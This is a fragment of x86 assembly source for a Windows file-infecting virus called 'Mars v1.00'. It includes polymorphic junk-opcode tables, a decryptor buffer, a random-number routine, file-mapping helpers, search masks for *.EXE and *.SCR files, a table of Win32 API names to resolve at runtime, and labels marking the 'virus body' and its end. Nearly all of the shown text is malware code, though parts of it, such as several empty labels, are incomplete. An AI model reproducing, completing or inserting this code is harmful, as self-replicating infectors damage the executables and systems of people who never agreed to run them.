;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Junk Data =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-
nOpcodes Equ 3
opcodes_1:
DB 1
Nop
opcodes_2:
DB 5
Or Eax, Eax
Or Ebx, Ebx
Or Ecx, Ecx
Or Edx, Edx
Push Eax
Pop Eax
opcodes_5:
DB 1
Add Ecx, 2
Dec Ecx
Dec Ecx

;PolyDataEnds:
;PolyDecrypt db 100 dup (90)
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              		Misc								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

GetRandomNum Proc
	Push Eax
	Xor Eax, Eax
	Mov Eax, DWord Ptr [Ebx + RandomBuffer]
	Push Eax
	Add Eax, 50
	Xor Eax, 04F367C34H
	IMul Eax, 0A5H
	Add Eax, 49
	Mov Ecx, 000004A6H
	Xor Edx, Edx
	Div Ecx
	IMul Eax, 05A37H
	Sub Eax, 6
	Pop Ecx
	;or ecx,00F000F0h
	;and eax,0FFF00FFFh
	Xor Eax, Ecx
	Mov DWord Ptr [Ebx + RandomBuffer], Eax
	Xor Edx, Edx
	Pop Ecx
	Div Ecx
	Mov Eax, Edx
	Ret
GetRandomNum EndP
AlignSize Proc
	;int 3
	Xor Edx, Edx
	Push Eax
	Div Ecx
	Pop Eax
	Sub Ecx, Edx
	Add Eax, Ecx
	Ret
AlignSize EndP
OpenAFile Proc
	Xor Eax, Eax
	Push FILE_ATTRIBUTE_NORMAL
	Push Esi
	Call [Ebx + _SetFileAttributes]
	Xor Eax, Eax
	Push Eax
	Push FILE_ATTRIBUTE_NORMAL
	Push OPEN_EXISTING
	Push Eax
	Push FILE_SHARE_READ + FILE_SHARE_WRITE
	Push GENERIC_READ + GENERIC_WRITE
	Push Esi
	Call [Ebx + _CreateFile]
	Ret
OpenAFile EndP

CreateMap Proc
	Xor Edx, Edx
	Push Edx
	Push Ecx
	Push Edx
	Push PAGE_READWRITE
	Push Edx
	Push Eax
	Call [Ebx + _CreateFileMapping]
	Ret
CreateMap EndP

MapFile Proc
	Xor Edx, Edx
	Push Ecx
	Push Edx
	Push Edx
	Push FILE_MAP_WRITE
	Push Eax
	Call [Ebx + _MapViewOfFile]
	Ret
MapFile EndP

DataStart:
 RandomBuffer DB 8 Dup (144)
 PolyDecrypt DB 1024 Dup (144)

 szTitle DB "Mars v1.00 by T.Degano ", 0
 szMessage DB "Copyright (c) 2006-2007 by Tiberio Degano .", 10, "and all rights reserved", 0
 OldEIP DD 00001000H
 ModBase DD ?
 kernel DD ?
 hFind DD ?
 ;hFile			  		DD ?
 ;hMap			  		DD ?
 ;lpFilePointer	  		DD ?
 FindData WIN32_FIND_DATA < >
 CurrentDir DB MAX_PATH Dup (?)
 EXESearch DB "*.EXE", 0
 SCRSearch DB "*.SCR", 0
 				  		DB 14 + 1
 szGetProcAddress DB "GetProcAddress", 0
 _GetProcAddress DD ?
; 				  		DB 14+1
; szVirtualProtect 		DB "VirtualProtect",0				;no need for saving it's Address we need it just for
 MAX_DECRYPTOR Equ 100															;get write access to the virus body
 buffer DB MAX_DECRYPTOR Dup (90)
 ;Constants:
; 	 mov edi,12345678h
; 	 mov ecx,VIRUS_BODY_SIZE
; 	 mov eax,12345678h
;_@1: xor Dword Ptr[edi],eax
; 	 add edi,4

; 	 loop FFFFFFFFh
one_byte:

two_byte:

three_byte:

API_TABLE:
				  	   	DB 20 + 1
 szGetCurrentDirectory DB "GetCurrentDirectoryA", 0
 _GetCurrentDirectory DD ?
				       	DB 20 + 1
 szSetCurrentDirectory DB "SetCurrentDirectoryA", 0
 _SetCurrentDirectory DD ?
 				  	   	DB 14 + 1
 szFindFirstFile DB "FindFirstFileA", 0
 _FindFirstFile DD ?
 				     	DB 13 + 1
 szFindNextFile DB "FindNextFileA", 0
 _FindNextFile DD ?
 				  		DB 9 + 1
 szFindClose DB "FindClose", 0
 _FindClose DD ?
 				  		DB 18 + 1
 szCreateFileMapping DB "CreateFileMappingA", 0
 _CreateFileMapping DD ?
 				  		DB 13 + 1
 szMapViewOfFile DB "MapViewOfFile", 0
 _MapViewOfFile DD ?
 				  		DB 11 + 1
 szCloseHandle DB "CloseHandle", 0
 _CloseHandle DD ?
  				  		DB 15 + 1
 szCloseMap DB "UnmapViewOfFile", 0
 _CloseMap DD ?
  				  		DB 11 + 1
 szCreateFile DB "CreateFileA", 0
 _CreateFile DD ?
   				  		DB 8 + 1
 szReadFile DB "ReadFile", 0				;think of error
 _ReadFile DD ?
   				  		DB 9 + 1
 szWriteFile DB "WriteFile", 0
 _WriteFile DD ?
    				    DB 18 + 1
 szSetFileAttributes DB "SetFileAttributesA", 0
 _SetFileAttributes DD ?
     				    DB 12 + 1
 szLoadLibrary DB "LoadLibraryA", 0
 _LoadLibrary DD ?
 						DB 12 + 1
 szGetTickCount DB "GetTickCount", 0
 _GetTickCount DD ?
 	  					DB 0BBH
API_TABLE_END:
 ;User 32 API
 						DB 6 + 1
  szUser32 DB "USER32", 0
  _User32 DD ?

USER32API:
						DB 11 + 1
 szMessageBox DB "MessageBoxA", 0
 _MessageBox DD ?
 						DB 40 Dup (0)
Virus_End:
						DB 0, 0, 0, 0



End March